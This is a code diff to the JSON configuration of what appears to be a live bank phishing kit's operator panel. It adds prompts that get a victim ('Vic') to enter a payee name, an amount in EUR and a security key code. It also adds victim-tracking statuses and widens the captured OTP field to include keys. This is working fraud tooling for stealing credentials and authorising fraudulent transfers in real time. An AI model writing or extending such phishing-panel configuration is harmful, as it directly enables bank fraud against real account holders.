@@ -565,6 +565,30 @@
         ]
       },
       {
+        "name": "ASK READ ME",
+        "status": "12",
+        "inputs": [
+          {
+            "id": "payeeName",
+            "placeholder": "Payee Name"
+          },
+          {
+            "id": "amount",
+            "placeholder": "Amount (EUR)"
+          }
+        ]
+      },
+      {
+        "name": "ASK KEY CODE",
+        "status": "14",
+        "inputs": [
+          {
+            "id": "keyNumber",
+            "placeholder": "Key"
+          }
+        ]
+      },
+      {
         "name": "FINISH",
         "status": "10"
       }
@@ -596,7 +620,7 @@
       },
       {
         "status": 7,
-        "meaning": "Vic Waiting... Submitted OTP/Token"
+        "meaning": "Vic Waiting... Submitted OTP/Token/Key"
       },
       {
         "status": 8,
@@ -609,6 +633,22 @@
       {
         "status": 11,
         "meaning": "Vic Submitting Mobile Auth"
+      },
+      {
+        "status": 12,
+        "meaning": "Vic Reading Read Me"
+      },
+      {
+        "status": 13,
+        "meaning": "Vic Submitted Read Me"
+      },
+      {
+        "status": 14,
+        "meaning": "Vic Submitting Key Code"
+      },
+      {
+        "status": 15,
+        "meaning": "Vic Rejected Key Code"
       }
     ],
     "information": [
@@ -621,7 +661,7 @@
         "key": "password"
       },
       {
-        "heading": "OTP/Token",
+        "heading": "OTP/Token/Key",
         "key": "otp"
       },
       {
